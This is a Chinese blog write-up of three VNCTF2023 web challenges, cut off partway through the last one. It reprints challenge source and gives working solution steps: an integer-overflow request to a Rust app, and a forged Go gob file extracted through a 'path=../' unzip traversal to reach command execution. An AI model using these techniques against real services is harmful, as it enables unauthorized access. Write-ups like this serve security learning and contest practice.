<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>VNCTF2023-WriteUp - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="VNCTF2023-WriteUp - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/02/VNCTF2023/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-02T14:44:54.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>2,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">VNCTF2023-WriteUp</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="队伍名称"><a href="#队伍名称" class="headerlink" title="队伍名称"></a>队伍名称</h1><p>Boogipop<br>希望可以进VN战队呀QWQ</p>
<h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><p>21&#x2F;1(总|Web)</p>
<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h3><p>传统JS题，直接在js文件里可以看到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676772613529-c2f2dd18-1557-4bcd-a930-3985a5f353d6.png#averageHue=%23fefdfc&clientId=u40879044-74e5-4&from=paste&height=119&id=ua89392f6&name=image.png&originHeight=149&originWidth=1226&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13130&status=done&style=none&taskId=u0b4585c1-a91b-41e1-86ca-b642c89f1c6&title=&width=980.8" alt="image.png"><br>JSFUCK编码直接放在console输入即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676772635959-1dbaf586-99cb-45f7-bdef-69bab8e2df4f.png#averageHue=%23080908&clientId=u40879044-74e5-4&from=paste&height=811&id=u2f94542b&name=image.png&originHeight=1014&originWidth=1873&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=640032&status=done&style=none&taskId=u176198ba-de4c-49db-a32e-ea9c67625e0&title=&width=1498.4" alt="image.png"></p>
<h3 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h3><p>是一个用RUST做的web(没见过），给了源码，重点在于：<br>需要100000000功德获取flag</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">context</span> = Context::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line">    context.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="title function_ invoke__">get</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &gt; <span class="number">1_000_000_000</span> &#123;</span><br><span class="line">        context.<span class="title function_ invoke__">insert</span>(</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            &amp;std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> tera.<span class="title function_ invoke__">render</span>(<span class="string">&quot;index.html&quot;</span>, &amp;context) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(body) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(body)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(err) =&gt; <span class="title function_ invoke__">Err</span>(error::<span class="title function_ invoke__">ErrorInternalServerError</span>(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/reset&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">reset</span>() <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    GONGDE.<span class="title function_ invoke__">set</span>(<span class="number">0</span>);</span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">true</span>,</span><br><span class="line">        message: <span class="string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/upgrade&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> body.quantity &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(payload) = PAYLOADS.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|u| u.name == body.name) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cost</span> = payload.cost;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> || payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            cost *= body.quantity;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; cost <span class="keyword">as</span> <span class="type">i32</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">false</span>,</span><br><span class="line">                message: <span class="string">&quot;功德不足&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cost != <span class="number">0</span> &#123;</span><br><span class="line">            GONGDE.<span class="title function_ invoke__">set</span>(GONGDE.<span class="title function_ invoke__">get</span>() - cost <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;小扣一手功德&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;CCCCCost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Loan&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;好人有好报&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Sleep&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;这是什么？床，睡一下&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">false</span>,</span><br><span class="line">        message: <span class="string">&quot;禁止开摆&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>/upgrade</code>路由中有上述5个功能，每个功能都需要传2个参数<code>name,quantity</code>，quantity是扣功德的倍数，看到这种题一开始想的是传负数，可是被ban了，因此思路其实很明确就是整形溢出：（其实一开始我是脚本爆破，发现不可能就转思路了）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773099077-430ae379-c38b-4a7d-bff5-021fa039cc38.png#averageHue=%23f9f7f6&clientId=u40879044-74e5-4&from=paste&height=318&id=u9067be65&name=image.png&originHeight=398&originWidth=1197&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=65278&status=done&style=none&taskId=ub474cb5f-d79f-49a5-884c-46592647f49&title=&width=957.6" alt="image.png"><br>代码中的功德是i32类型，所以范围就是<code>-2147483647~2147483647</code>,这里通过整形溢出绕过判断<code>if GONGDE.get() &lt; cost as i32</code>，因此payload为：<br><code>POST /upgrade :name=cost&amp;quantity=2000000000</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773397186-68460a5c-6cff-4b33-bb07-77d9e87c4efe.png#averageHue=%23abaaaa&clientId=u40879044-74e5-4&from=paste&height=626&id=u02dc01d8&name=image.png&originHeight=782&originWidth=869&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36718&status=done&style=none&taskId=udeed35c1-1ce3-4bf8-9247-3550511a32f&title=&width=695.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773367893-0807d0fc-9a5a-479e-8977-661ac240a7b5.png#averageHue=%23070706&clientId=u40879044-74e5-4&from=paste&height=183&id=u96b39278&name=image.png&originHeight=229&originWidth=1459&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=22004&status=done&style=none&taskId=u7affcab1-b7d1-4a8c-bd1d-89c683a9a76&title=&width=1167.2" alt="image.png"></p>
<h3 id="babyGo"><a href="#babyGo" class="headerlink" title="babyGo"></a>babyGo</h3><p>一道go的反序列化以及Goeval逃逸，源码也是给出了，重点逻辑在于：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">r.<span class="title function_ invoke__">GET</span>(<span class="string">&quot;/unzip&quot;</span>, <span class="title function_ invoke__">func</span>(c *gin.Context) &#123;</span><br><span class="line">		session := sessions.<span class="title function_ invoke__">Default</span>(c)</span><br><span class="line">		<span class="keyword">if</span> session.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;shallow&quot;</span>) == nil &#123;</span><br><span class="line">			c.<span class="title function_ invoke__">Redirect</span>(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userUploadDir := session.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;shallow&quot;</span>).(string) + <span class="string">&quot;uploads/&quot;</span></span><br><span class="line">		files, _ := fileutil.<span class="title function_ invoke__">ListFileNames</span>(userUploadDir)</span><br><span class="line">		destPath := filepath.<span class="title function_ invoke__">Clean</span>(userUploadDir + c.<span class="title function_ invoke__">Query</span>(<span class="string">&quot;path&quot;</span>))</span><br><span class="line">		<span class="keyword">for</span> <span class="title class_">_</span>, file := range files &#123;</span><br><span class="line">			<span class="keyword">if</span> fileutil.<span class="title function_ invoke__">MiMeType</span>(userUploadDir+file) == <span class="string">&quot;application/zip&quot;</span> &#123;</span><br><span class="line">				err := fileutil.<span class="title function_ invoke__">UnZip</span>(userUploadDir+file, destPath)</span><br><span class="line">				<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">					c.<span class="title function_ invoke__">HTML</span>(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;failed to unzip file&quot;</span>&#125;)</span><br><span class="line">					<span class="keyword">return</span></span><br><span class="line">				&#125;</span><br><span class="line">				fileutil.<span class="title function_ invoke__">RemoveFile</span>(userUploadDir + file)</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		c.<span class="title function_ invoke__">HTML</span>(<span class="number">200</span>, <span class="string">&quot;zip.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;success unzip&quot;</span>&#125;)</span><br><span class="line">	&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">r.<span class="title function_ invoke__">GET</span>(<span class="string">&quot;/backdoor&quot;</span>, <span class="title function_ invoke__">func</span>(c *gin.Context) &#123;</span><br><span class="line">		session := sessions.<span class="title function_ invoke__">Default</span>(c)</span><br><span class="line">		<span class="keyword">if</span> session.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;shallow&quot;</span>) == nil &#123;</span><br><span class="line">			c.<span class="title function_ invoke__">Redirect</span>(http.StatusFound, <span class="string">&quot;/&quot;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		userDir := session.<span class="title function_ invoke__">Get</span>(<span class="string">&quot;shallow&quot;</span>).(string)</span><br><span class="line">		<span class="keyword">if</span> fileutil.<span class="title function_ invoke__">IsExist</span>(userDir + <span class="string">&quot;user.gob&quot;</span>) &#123;</span><br><span class="line">			file, _ := os.<span class="title function_ invoke__">Open</span>(userDir + <span class="string">&quot;user.gob&quot;</span>)</span><br><span class="line">			decoder := gob.<span class="title function_ invoke__">NewDecoder</span>(file)</span><br><span class="line">			var ctfer User</span><br><span class="line">			decoder.<span class="title function_ invoke__">Decode</span>(&amp;ctfer)</span><br><span class="line">			<span class="keyword">if</span> ctfer.Power == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">				eval, err := goeval.<span class="title function_ invoke__">Eval</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;fmt.Println(\&quot;Good\&quot;)&quot;</span>, c.<span class="title function_ invoke__">DefaultQuery</span>(<span class="string">&quot;pkg&quot;</span>, <span class="string">&quot;fmt&quot;</span>))</span><br><span class="line">				<span class="keyword">if</span> err != nil &#123;</span><br><span class="line">					fmt.<span class="title function_ invoke__">Println</span>(err)</span><br><span class="line">				&#125;</span><br><span class="line">				c.<span class="title function_ invoke__">HTML</span>(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="title function_ invoke__">string</span>(eval)&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				c.<span class="title function_ invoke__">HTML</span>(<span class="number">200</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;low power&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			c.<span class="title function_ invoke__">HTML</span>(<span class="number">500</span>, <span class="string">&quot;backdoor.html&quot;</span>, gin.H&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;no such user gob&quot;</span>&#125;)</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.<span class="title function_ invoke__">Run</span>(<span class="string">&quot;:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目一开始在user目录下创建了一个<code>user.gob</code>文件，但又ban掉了gob上传后缀，因此不能直接上传，题目给了unzip选项，只需要上传zip文件夹，之后unzip解压即可，在unzip路由可以指定path，利用这一点覆盖user目录的user.gob即可，之后就可以通过goeval命令执行<br>知道思路后可以开始编辑payload：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	Name  <span class="type">string</span></span><br><span class="line">	Path  <span class="type">string</span></span><br><span class="line">	Power <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///tmp/2008ebd2e4fc55eed0953f80a1dec1d5/</span></span><br><span class="line"><span class="comment">// /tmp/2008ebd2e4fc55eed0953f80a1dec1d5/uploads/get.zip</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	p := User&#123;</span><br><span class="line">		Power: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">		Name: <span class="string">&quot;Boogipop&quot;</span>,</span><br><span class="line">		Path:<span class="string">&quot;test&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line">	name := <span class="string">&quot;user.gob&quot;</span>	</span><br><span class="line">	File, _ := os.OpenFile(name, os.O_RDWR|os.O_CREATE, <span class="number">0777</span>)</span><br><span class="line">	<span class="keyword">defer</span> File.Close()</span><br><span class="line">	enc := gob.NewEncoder(File)</span><br><span class="line">	err := enc.Encode(p)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>go run user.go</code>,获得gob文件，将其压缩为<code>user.zip</code>，之后先上传该文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773787085-caf0280e-2016-4e3c-a460-3be8c4712b38.png#averageHue=%23e2b770&clientId=u40879044-74e5-4&from=paste&height=220&id=u362aed55&name=image.png&originHeight=275&originWidth=862&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21205&status=done&style=none&taskId=ud97e00b7-7e28-4c78-8cb2-54dadca8489&title=&width=689.6" alt="image.png"><br>再去unzip目录解压，这里注意user目录是在<code>/tmp/ce79848ad6b3d871366ad85af49cd3f8/</code>下，而zip文件在<code>/tmp/ce79848ad6b3d871366ad85af49cd3f8/uploads/</code>目录下，因此指定<code>path=../</code>覆盖user.gob文件：<br><code>[http://614a29b7-dd93-41d9-b195-032ae746ef97.node4.buuoj.cn:81/unzip?path=../](http://614a29b7-dd93-41d9-b195-032ae746ef97.node4.buuoj.cn:81/unzip?path=../)</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773922286-2f48fc62-73c1-40c3-aee5-c9be97e54b37.png#averageHue=%23abc0ed&clientId=u40879044-74e5-4&from=paste&height=544&id=u1d2ae87a&name=image.png&originHeight=680&originWidth=1773&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=214715&status=done&style=none&taskId=u955393e5-0e12-440c-80f7-fdbbe9d002f&title=&width=1418.4" alt="image.png"><br>在访问backdoor路由查看是否成功：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1676773954120-47f28ecb-5bd4-48f7-ba45-94945756bd0f.png#averageHue=%23aaaba9&clientId=u40879044-74e5-4&from=paste&height=395&id=u5d88cd28&name=image.png&originHeight=494&originWidth=1260&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=95031&status=done&style=none&taskId=u4c5cf131-81c7-419c-a284-efa3ca40c73&title=&width=1008" alt="image.png"><br>覆盖是成功了，也就是可以进入命令执行部分了：<br><code>eval, 